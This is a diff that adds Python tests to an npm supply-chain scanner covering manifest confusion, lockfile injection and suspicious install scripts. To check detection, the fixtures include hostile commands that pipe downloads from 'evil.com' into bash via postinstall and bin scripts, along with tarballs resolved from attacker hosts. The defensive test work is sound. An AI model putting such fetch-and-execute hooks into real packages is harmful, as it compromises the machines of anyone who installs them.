@@ -262,3 +262,227 @@ class TestFundingUrlFalsePositives:
         }))
         findings = scanner.scan_lockfile(str(lock), "package-lock.json")
         assert not any("tidelift" in f.snippet for f in findings)
+
+
+class TestManifestConfusion:
+    """Tests for manifest confusion detection (Item 2)."""
+
+    def test_script_references_missing_file(self, tmp_path):
+        """Script referencing a non-existent file should flag."""
+        pkg = tmp_path / "package.json"
+        pkg.write_text(json.dumps({
+            "name": "test",
+            "scripts": {
+                "postinstall": "node ./setup.js"
+            },
+            "dependencies": {}
+        }))
+        findings = scanner.scan_manifest_confusion(str(pkg), "package.json")
+        assert any(f.category == "manifest-confusion" for f in findings)
+
+    def test_script_references_existing_file_ok(self, tmp_path):
+        """Script referencing an existing file should not flag."""
+        pkg = tmp_path / "package.json"
+        pkg.write_text(json.dumps({
+            "name": "test",
+            "scripts": {
+                "build": "node ./build.js"
+            },
+            "dependencies": {}
+        }))
+        (tmp_path / "build.js").write_text("console.log('building')")
+        findings = scanner.scan_manifest_confusion(str(pkg), "package.json")
+        script_findings = [f for f in findings if "missing file" in f.title]
+        assert len(script_findings) == 0
+
+    def test_main_points_to_high_entropy_file(self, tmp_path):
+        """main field pointing to high-entropy file should flag."""
+        import random
+        pkg = tmp_path / "package.json"
+        pkg.write_text(json.dumps({
+            "name": "test",
+            "main": "./index.js",
+            "dependencies": {}
+        }))
+        # Create high-entropy file using all printable ASCII chars (wide charset = higher entropy)
+        charset = ''.join(chr(i) for i in range(33, 127))  # 94 printable chars
+        random.seed(42)
+        random_content = ''.join(random.choice(charset) for _ in range(2000))
+        (tmp_path / "index.js").write_text(random_content)
+        findings = scanner.scan_manifest_confusion(str(pkg), "package.json")
+        entropy_findings = [f for f in findings if "entropy" in f.title]
+        assert len(entropy_findings) > 0
+
+    def test_bin_with_suspicious_curl_pipe_bash(self, tmp_path):
+        """Bin entry with curl piped to bash should flag."""
+        pkg = tmp_path / "package.json"
+        pkg.write_text(json.dumps({
+            "name": "test",
+            "bin": {"cli": "./cli.sh"},
+            "dependencies": {}
+        }))
+        (tmp_path / "cli.sh").write_text("#!/bin/bash\ncurl http://evil.com/payload | bash\n")
+        findings = scanner.scan_manifest_confusion(str(pkg), "package.json")
+        bin_findings = [f for f in findings if "bin" in f.title.lower()]
+        assert len(bin_findings) > 0
+        assert any(f.severity == "high" for f in bin_findings)
+
+    def test_invalid_json_skips_gracefully(self, tmp_path):
+        """Invalid JSON should not crash."""
+        pkg = tmp_path / "package.json"
+        pkg.write_text("not json{{{")
+        findings = scanner.scan_manifest_confusion(str(pkg), "package.json")
+        assert len(findings) == 0
+
+
+class TestLockfileInjection:
+    """Tests for lockfile injection detection (Item 3)."""
+
+    def test_pnpm_http_tarball(self, tmp_path):
+        """HTTP tarballs in pnpm-lock.yaml should flag."""
+        lock = tmp_path / "pnpm-lock.yaml"
+        lock.write_text(
+            "lockfileVersion: '9.0'\n"
+            "packages:\n"
+            "  lodash@4.17.21:\n"
+            "    resolution: {tarball: http://evil.com/lodash-4.17.21.tgz}\n"
+        )
+        findings = scanner.scan_lockfile_injection(str(lock), "pnpm-lock.yaml")
+        assert any(f.category == "lockfile-injection" for f in findings)
+        assert any(f.severity == "high" for f in findings)
+
+    def test_package_lock_missing_integrity(self, tmp_path):
+        """package-lock.json entry missing integrity should flag."""
+        lock = tmp_path / "package-lock.json"
+        lock.write_text(json.dumps({
+            "lockfileVersion": 3,
+            "packages": {
+                "node_modules/evil-pkg": {
+                    "version": "1.0.0",
+                    "resolved": "https://registry.npmjs.org/evil-pkg/-/evil-pkg-1.0.0.tgz"
+                }
+            }
+        }))
+        findings = scanner.scan_lockfile_injection(str(lock), "package-lock.json")
+        assert any(f.category == "lockfile-injection" for f in findings)
+        assert any("integrity" in f.title.lower() for f in findings)
+
+    def test_package_lock_with_integrity_ok(self, tmp_path):
+        """package-lock.json entry WITH integrity should not flag."""
+        lock = tmp_path / "package-lock.json"
+        lock.write_text(json.dumps({
+            "lockfileVersion": 3,
+            "packages": {
+                "node_modules/safe-pkg": {
+                    "version": "1.0.0",
+                    "resolved": "https://registry.npmjs.org/safe-pkg/-/safe-pkg-1.0.0.tgz",
+                    "integrity": "sha512-abc123..."
+                }
+            }
+        }))
+        findings = scanner.scan_lockfile_injection(str(lock), "package-lock.json")
+        integrity_findings = [f for f in findings if "integrity" in f.title.lower()]
+        assert len(integrity_findings) == 0
+
+    def test_yarn_lock_non_registry_url(self, tmp_path):
+        """yarn.lock resolved to non-registry domain should flag."""
+        lock = tmp_path / "yarn.lock"
+        lock.write_text(
+            '# yarn lockfile v1\n\n'
+            '"lodash@^4.17.0":\n'
+            '  version "4.17.21"\n'
+            '  resolved "https://evil-registry.com/lodash-4.17.21.tgz"\n'
+            '  integrity sha512-abc...\n'
+        )
+        findings = scanner.scan_lockfile_injection(str(lock), "yarn.lock")
+        assert any(f.category == "lockfile-injection" for f in findings)
+        assert any("evil-registry.com" in f.description for f in findings)
+
+    def test_yarn_lock_registry_ok(self, tmp_path):
+        """yarn.lock resolved to standard registry should not flag."""
+        lock = tmp_path / "yarn.lock"
+        lock.write_text(
+            '# yarn lockfile v1\n\n'
+            '"lodash@^4.17.0":\n'
+            '  version "4.17.21"\n'
+            '  resolved "https://registry.npmjs.org/lodash/-/lodash-4.17.21.tgz"\n'
+            '  integrity sha512-abc...\n'
+        )
+        findings = scanner.scan_lockfile_injection(str(lock), "yarn.lock")
+        assert len(findings) == 0
+
+
+class TestBehavioralSignals:
+    """Tests for behavioral scoring signals (Item 7)."""
+
+    def test_network_plus_fs_write_in_install(self, tmp_path):
+        """Install script with both network and fs write patterns should flag."""
+        pkg = tmp_path / "package.json"
+        pkg.write_text(json.dumps({
+            "name": "test",
+            "scripts": {
+                "postinstall": "curl http://evil.com/config > /tmp/config && cp /tmp/config ./node_modules/.cache"
+            },
+            "dependencies": {}
+        }))
+        findings = scanner.scan_behavioral_signals(str(pkg), "package.json")
+        assert any(f.category == "behavioral-signal" for f in findings)
+
+    def test_obfuscated_install_script(self, tmp_path):
+        """High-entropy install script should flag as obfuscated."""
+        import random
+        random.seed(42)
+        obfuscated = ''.join(random.choice(
+            'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()[]{}|;:,.<>?/~`'
+        ) for _ in range(200))
+        pkg = tmp_path / "package.json"
+        pkg.write_text(json.dumps({
+            "name": "test",
+            "scripts": {
+                "postinstall": obfuscated
+            },
+            "dependencies": {}
+        }))
+        findings = scanner.scan_behavioral_signals(str(pkg), "package.json")
+        assert any("obfuscated" in f.title for f in findings)
+
+    def test_postinstall_download_and_exec(self, tmp_path):
+        """postinstall that downloads and executes should flag."""
+        pkg = tmp_path / "package.json"
+        pkg.write_text(json.dumps({
+            "name": "test",
+            "scripts": {
+                "postinstall": "curl -s http://evil.com/setup.sh | bash"
+            },
+            "dependencies": {}
+        }))
+        findings = scanner.scan_behavioral_signals(str(pkg), "package.json")
+        assert any("downloads and executes" in f.title for f in findings)
+
+    def test_clean_scripts_not_flagged(self, tmp_path):
+        """Normal build scripts should not flag behavioral signals."""
+        pkg = tmp_path / "package.json"
+        pkg.write_text(json.dumps({
+            "name": "test",
+            "scripts": {
+                "build": "tsc",
+                "test": "jest",
+                "prepare": "husky install"
+            },
+            "dependencies": {}
+        }))
+        findings = scanner.scan_behavioral_signals(str(pkg), "package.json")
+        assert len(findings) == 0
+
+    def test_no_install_scripts_not_flagged(self, tmp_path):
+        """Package without install scripts should not flag."""
+        pkg = tmp_path / "package.json"
+        pkg.write_text(json.dumps({
+            "name": "test",
+            "scripts": {
+                "start": "node index.js"
+            },
+            "dependencies": {}
+        }))
+        findings = scanner.scan_behavioral_signals(str(pkg), "package.json")
+        assert len(findings) == 0
